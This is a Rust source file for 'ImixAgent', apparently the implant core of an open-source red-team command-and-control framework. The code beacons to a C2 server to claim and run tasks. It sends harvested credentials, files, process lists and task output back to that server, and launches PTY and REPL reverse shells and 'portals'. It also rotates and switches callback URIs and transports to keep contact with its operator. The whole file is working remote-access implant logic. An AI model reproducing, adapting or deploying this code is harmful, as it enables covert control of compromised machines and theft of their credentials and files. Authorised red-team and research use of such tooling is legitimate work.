use anyhow::{Context, Result};
use eldritch_agent::Agent;
use pb::c2::{self, ClaimTasksRequest};
use pb::config::Config;
use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};
use tokio::sync::RwLock;
use transport::Transport;

use crate::portal::run_create_portal;
use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
use crate::task::TaskRegistry;

#[derive(Clone)]
pub struct ImixAgent<T: Transport> {
    config: Arc<RwLock<Config>>,
    transport: Arc<RwLock<T>>,
    runtime_handle: tokio::runtime::Handle,
    pub task_registry: Arc<TaskRegistry>,
    pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
    pub output_buffer: Arc<Mutex<Vec<c2::ReportTaskOutputRequest>>>,
}

impl<T: Transport + Sync + 'static> ImixAgent<T> {
    pub fn new(
        config: Config,
        transport: T,
        runtime_handle: tokio::runtime::Handle,
        task_registry: Arc<TaskRegistry>,
    ) -> Self {
        Self {
            config: Arc::new(RwLock::new(config)),
            transport: Arc::new(RwLock::new(transport)),
            runtime_handle,
            task_registry,
            subtasks: Arc::new(Mutex::new(BTreeMap::new())),
            output_buffer: Arc::new(Mutex::new(Vec::new())),
        }
    }

    pub fn get_callback_interval_u64(&self) -> Result<u64> {
        // Blocks on read, but it's fast
        let cfg = self
            .config
            .try_read()
            .map_err(|_| anyhow::anyhow!("Failed to acquire read lock on config"))?;
        let info = cfg
            .info
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;

        let available_transports = info
            .available_transports
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("no available transports set"))?;

        let active_idx = available_transports.active_index as usize;
        let interval = available_transports
            .transports
            .get(active_idx)
            .or_else(|| available_transports.transports.first())
            .ok_or_else(|| anyhow::anyhow!("no transports configured"))?
            .interval;

        Ok(interval)
    }

    // Triggers config.refresh_primary_ip() in a write lock
    pub async fn refresh_ip(&self) {
        let mut cfg = self.config.write().await;
        cfg.refresh_primary_ip();
    }

    // Updates the shared transport with a new instance
    pub async fn update_transport(&self, t: T) {
        let mut transport = self.transport.write().await;
        *transport = t;
    }

    // Flushes all buffered task outputs using the provided transport
    pub async fn flush_outputs(&self) {
        // Wait a short delay to allow tasks to produce output
        tokio::time::sleep(std::time::Duration::from_millis(100)).await;

        // Drain the buffer
        let outputs: Vec<_> = {
            match self.output_buffer.lock() {
                Ok(mut b) => b.drain(..).collect(),
                Err(_) => return,
            }
        };

        #[cfg(debug_assertions)]
        log::info!("Flushing {} task outputs", outputs.len());

        if outputs.is_empty() {
            return;
        }

        let mut transport = self.transport.write().await;
        for output in outputs {
            #[cfg(debug_assertions)]
            log::info!("Task Output: {output:#?}");

            if let Err(_e) = transport.report_task_output(output).await {
                #[cfg(debug_assertions)]
                log::error!("Failed to report task output: {_e}");
            }
        }
    }

    // Helper to get config URIs for creating new transport
    pub async fn get_transport_config(&self) -> Config {
        let config = self.config.read().await.clone();
        config
    }

    pub async fn rotate_callback_uri(&self) {
        let mut cfg = self.config.write().await;
        if let Some(info) = cfg.info.as_mut() {
            if let Some(available_transports) = info.available_transports.as_mut() {
                let num_transports = available_transports.transports.len();
                if num_transports > 0 {
                    let current_idx = available_transports.active_index as usize;
                    available_transports.active_index = ((current_idx + 1) % num_transports) as u32;
                }
            }
        }
    }

    // Helper to get a usable transport.
    // If the shared transport is active, returns a clone of it.
    // If not, creates a new one from config.
    async fn get_usable_transport(&self) -> Result<T> {
        // 1. Check shared transport
        {
            let guard = self.transport.read().await;
            if guard.is_active() {
                return Ok(guard.clone());
            }
        }

        // 2. Create new transport from config
        let config = self.get_transport_config().await;
        let t = T::new(config).context("Failed to create on-demand transport")?;

        #[cfg(debug_assertions)]
        log::debug!("Created on-demand transport for background task");

        Ok(t)
    }

    // Helper to claim tasks and return them, so main can spawn
    pub async fn claim_tasks(&self) -> Result<Vec<pb::c2::Task>> {
        let mut transport = self.transport.write().await;
        let beacon_info = self.config.read().await.info.clone();
        let req = ClaimTasksRequest {
            beacon: beacon_info,
        };
        let response = transport
            .claim_tasks(req)
            .await
            .context("Failed to claim tasks")?;
        Ok(response.tasks)
    }

    pub async fn process_job_request(&self) -> Result<()> {
        let tasks = self.claim_tasks().await?;
        if tasks.is_empty() {
            return Ok(());
        }

        let registry = self.task_registry.clone();
        let agent = Arc::new(self.clone());
        for task in tasks {
            registry.spawn(task, agent.clone());
        }
        Ok(())
    }

    // Helper to run a future on the runtime handle, blocking the current thread.
    fn block_on<F, R>(&self, future: F) -> Result<R, String>
    where
        F: std::future::Future<Output = Result<R, String>>,
    {
        self.runtime_handle.block_on(future)
    }

    // Helper to execute an async action with a usable transport, handling setup and errors.
    fn with_transport<F, Fut, R>(&self, action: F) -> Result<R, String>
    where
        F: FnOnce(T) -> Fut,
        Fut: std::future::Future<Output = Result<R, anyhow::Error>>,
    {
        self.block_on(async {
            let t = self
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            action(t).await.map_err(|e| e.to_string())
        })
    }

    // Helper to spawn a background subtask (like a reverse shell)
    fn spawn_subtask<F, Fut>(&self, task_id: i64, action: F) -> Result<(), String>
    where
        F: FnOnce(T) -> Fut + Send + 'static,
        Fut: std::future::Future<Output = Result<()>> + Send + 'static,
    {
        let subtasks = self.subtasks.clone();
        let agent = self.clone();

        let handle = self.runtime_handle.spawn(async move {
            // We need a transport for the subtask. Get it asynchronously.
            match agent.get_usable_transport().await {
                Ok(transport) => {
                    if let Err(_e) = action(transport).await {
                        #[cfg(debug_assertions)]
                        log::error!("Subtask {} error: {_e:#}", task_id);
                    }
                }
                Err(_e) => {
                    #[cfg(debug_assertions)]
                    log::error!("Subtask {} failed to get transport: {_e:#}", task_id);
                }
            }
        });

        if let Ok(mut map) = subtasks.lock() {
            map.insert(task_id, handle);
        }

        Ok(())
    }
}

// Implement the Eldritch Agent Trait
impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
        self.with_transport(|mut t| async move {
            // Transport uses std::sync::mpsc::Sender for fetch_asset
            let (tx, rx) = std::sync::mpsc::channel();
            t.fetch_asset(req, tx).await?;

            let mut data = Vec::new();
            while let Ok(resp) = rx.recv() {
                data.extend(resp.chunk);
            }
            Ok(data)
        })
    }

    fn report_credential(
        &self,
        req: c2::ReportCredentialRequest,
    ) -> Result<c2::ReportCredentialResponse, String> {
        self.with_transport(|mut t| async move { t.report_credential(req).await })
    }

    fn report_file(&self, req: c2::ReportFileRequest) -> Result<c2::ReportFileResponse, String> {
        self.with_transport(|mut t| async move {
            // Transport uses std::sync::mpsc::Receiver for report_file
            let (tx, rx) = std::sync::mpsc::channel();
            tx.send(req)?;
            drop(tx);
            t.report_file(rx).await
        })
    }

    fn report_process_list(
        &self,
        req: c2::ReportProcessListRequest,
    ) -> Result<c2::ReportProcessListResponse, String> {
        self.with_transport(|mut t| async move { t.report_process_list(req).await })
    }

    fn report_task_output(
        &self,
        req: c2::ReportTaskOutputRequest,
    ) -> Result<c2::ReportTaskOutputResponse, String> {
        // Buffer output instead of sending immediately
        let mut buffer = self.output_buffer.lock().map_err(|e| e.to_string())?;
        buffer.push(req);
        Ok(c2::ReportTaskOutputResponse {})
    }

    fn start_reverse_shell(&self, task_id: i64, cmd: Option<String>) -> Result<(), String> {
        self.spawn_subtask(task_id, move |transport| async move {
            run_reverse_shell_pty(task_id, cmd, transport).await
        })
    }

    fn create_portal(&self, task_id: i64) -> Result<(), String> {
        self.spawn_subtask(task_id, move |transport| async move {
            run_create_portal(task_id, transport).await
        })
    }

    fn start_repl_reverse_shell(&self, task_id: i64) -> Result<(), String> {
        let agent = self.clone();
        self.spawn_subtask(task_id, move |transport| async move {
            run_repl_reverse_shell(task_id, transport, agent).await
        })
    }

    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
        self.with_transport(|mut t| async move { t.claim_tasks(req).await })
    }

    fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
        let mut map = BTreeMap::new();
        // Blocks on read, but it's fast
        let cfg = self
            .block_on(async { Ok(self.config.read().await.clone()) })
            .map_err(|e: String| e)?;

        let active_uri = self.get_active_callback_uri().unwrap_or_default();
        let config = cfg.clone();

        let available_transports = config
            .info
            .as_ref()
            .and_then(|info| info.available_transports.as_ref())
            .context("failed to get available transports")
            .map_err(|e| e.to_string())?;

        let active_idx = available_transports.active_index as usize;
        let active_transport = available_transports
            .transports
            .get(active_idx)
            .or_else(|| available_transports.transports.first())
            .context("no transports configured")
            .map_err(|e| e.to_string())?;

        map.insert("callback_uri".to_string(), active_uri);
        map.insert(
            "retry_interval".to_string(),
            active_transport.interval.to_string(),
        );
        map.insert("run_once".to_string(), cfg.run_once.to_string());

        if let Some(info) = &cfg.info {
            map.insert("beacon_id".to_string(), info.identifier.clone());
            map.insert("principal".to_string(), info.principal.clone());
            map.insert(
                "interval".to_string(),
                active_transport.interval.to_string(),
            );
            if let Some(host) = &info.host {
                map.insert("hostname".to_string(), host.name.clone());
                map.insert("platform".to_string(), host.platform.to_string());
                map.insert("primary_ip".to_string(), host.primary_ip.clone());
            }
            map.insert("uri".to_string(), active_transport.uri.clone());
            map.insert(
                "type".to_string(),
                active_transport.r#type.clone().to_string(),
            );
            map.insert(
                "extra".to_string(),
                active_transport.extra.clone().to_string(),
            );
        }
        Ok(map)
    }

    fn get_transport(&self) -> Result<String, String> {
        // Blocks on read, but it's fast
        self.block_on(async {
            let t = self
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            Ok(t.name().to_string())
        })
    }

    // TODO: This should probably be removed as schema and transport should be directly tied to one another.
    fn set_transport(&self, transport: String) -> Result<(), String> {
        let available = self.list_transports()?;
        if !available.contains(&transport) {
            return Err(format!("Invalid transport: {}", transport));
        }

        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut() {
                if let Some(available_transports) = info.available_transports.as_mut() {
                    let active_idx = available_transports.active_index as usize;
                    if let Some(current_transport) = available_transports.transports.get(active_idx)
                    {
                        let current_uri = &current_transport.uri;
                        // Create new URI with the new transport scheme
                        let new_uri = if let Some(pos) = current_uri.find("://") {
                            format!("{}://{}", transport, &current_uri[pos + 3..])
                        } else {
                            format!("{}://{}", transport, current_uri)
                        };

                        // Create a new transport with the new URI
                        let new_transport = pb::c2::Transport {
                            uri: new_uri,
                            interval: current_transport.interval,
                            r#type: current_transport.r#type,
                            extra: current_transport.extra.clone(),
                        };

                        // Append the new transport and update active_index
                        available_transports.transports.push(new_transport);
                        available_transports.active_index =
                            (available_transports.transports.len() - 1) as u32;
                    }
                }
            }
            Ok(())
        })
    }

    fn list_transports(&self) -> Result<Vec<String>, String> {
        self.block_on(async { Ok(self.transport.read().await.list_available()) })
    }

    fn get_callback_interval(&self) -> Result<u64, String> {
        self.get_callback_interval_u64().map_err(|e| e.to_string())
    }

    fn set_callback_interval(&self, interval: u64) -> Result<(), String> {
        self.block_on(async {
            {
                let mut cfg = self.config.write().await;
                if let Some(info) = &mut cfg.info
                    && let Some(available_transports) = &mut info.available_transports
                {
                    let active_idx = available_transports.active_index as usize;
                    if let Some(transport) = available_transports.transports.get_mut(active_idx) {
                        transport.interval = interval;
                    }
                }
            }
            // We force a check-in to update the server with the new interval
            let _ = self.process_job_request().await;
            Ok(())
        })
    }

    fn set_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut() {
                if let Some(available_transports) = info.available_transports.as_mut() {
                    // Check if URI already exists
                    if let Some(pos) = available_transports
                        .transports
                        .iter()
                        .position(|t| t.uri == uri)
                    {
                        // Set active_index to existing transport
                        available_transports.active_index = pos as u32;
                    } else {
                        // Get current transport as template
                        let active_idx = available_transports.active_index as usize;
                        let template = available_transports
                            .transports
                            .get(active_idx)
                            .or_else(|| available_transports.transports.first())
                            .cloned();

                        if let Some(tmpl) = template {
                            // Create new transport with the new URI
                            let new_transport = pb::c2::Transport {
                                uri,
                                interval: tmpl.interval,
                                r#type: tmpl.r#type,
                                extra: tmpl.extra,
                            };
                            available_transports.transports.push(new_transport);
                            available_transports.active_index =
                                (available_transports.transports.len() - 1) as u32;
                        }
                    }
                }
            }
            Ok(())
        })
    }

    fn list_callback_uris(&self) -> Result<BTreeSet<String>, String> {
        self.block_on(async {
            let cfg = self.config.read().await;
            let uris: BTreeSet<String> = cfg
                .info
                .as_ref()
                .and_then(|info| info.available_transports.as_ref())
                .map(|at| at.transports.iter().map(|t| t.uri.clone()).collect())
                .unwrap_or_default();
            Ok(uris)
        })
    }

    fn get_active_callback_uri(&self) -> Result<String, String> {
        self.block_on(async {
            let cfg = self.config.read().await;
            cfg.info
                .as_ref()
                .and_then(|info| info.available_transports.as_ref())
                .and_then(|at| {
                    let active_idx = at.active_index as usize;
                    at.transports
                        .get(active_idx)
                        .or_else(|| at.transports.first())
                })
                .map(|t| t.uri.clone())
                .ok_or_else(|| "No callback URIs configured".to_string())
        })
    }

    fn get_next_callback_uri(&self) -> Result<String, String> {
        self.block_on(async {
            let cfg = self.config.read().await;
            cfg.info
                .as_ref()
                .and_then(|info| info.available_transports.as_ref())
                .and_then(|at| {
                    if at.transports.is_empty() {
                        return None;
                    }
                    let current_idx = at.active_index as usize;
                    let next_idx = (current_idx + 1) % at.transports.len();
                    at.transports.get(next_idx)
                })
                .map(|t| t.uri.clone())
                .ok_or_else(|| "No callback URIs configured".to_string())
        })
    }

    fn add_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut() {
                if let Some(available_transports) = info.available_transports.as_mut() {
                    // Check if URI already exists
                    if !available_transports.transports.iter().any(|t| t.uri == uri) {
                        // Get current transport as template
                        let template = available_transports
                            .transports
                            .first()
                            .cloned()
                            .unwrap_or_else(|| pb::c2::Transport {
                                uri: uri.clone(),
                                interval: 5,
                                r#type: 0,
                                extra: String::new(),
                            });

                        let new_transport = pb::c2::Transport {
                            uri,
                            interval: template.interval,
                            r#type: template.r#type,
                            extra: template.extra,
                        };
                        available_transports.transports.push(new_transport);
                    }
                }
            }
            Ok(())
        })
    }

    fn remove_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut() {
                if let Some(available_transports) = info.available_transports.as_mut() {
                    if let Some(pos) = available_transports
                        .transports
                        .iter()
                        .position(|t| t.uri == uri)
                    {
                        available_transports.transports.remove(pos);
                        // Adjust active_index if needed
                        let active_idx = available_transports.active_index as usize;
                        if active_idx >= available_transports.transports.len()
                            && !available_transports.transports.is_empty()
                        {
                            available_transports.active_index = 0;
                        }
                    }
                }
            }
            Ok(())
        })
    }

    fn list_tasks(&self) -> Result<Vec<c2::Task>, String> {
        Ok(self.task_registry.list())
    }

    fn stop_task(&self, task_id: i64) -> Result<(), String> {
        self.task_registry.stop(task_id);
        // Also stop subtask
        let mut map = self
            .subtasks
            .lock()
            .map_err(|_| "Poisoned lock".to_string())?;
        if let Some(handle) = map.remove(&task_id) {
            handle.abort();
            #[cfg(debug_assertions)]
            log::info!("Aborted subtask {task_id}");
        }
        Ok(())
    }
}
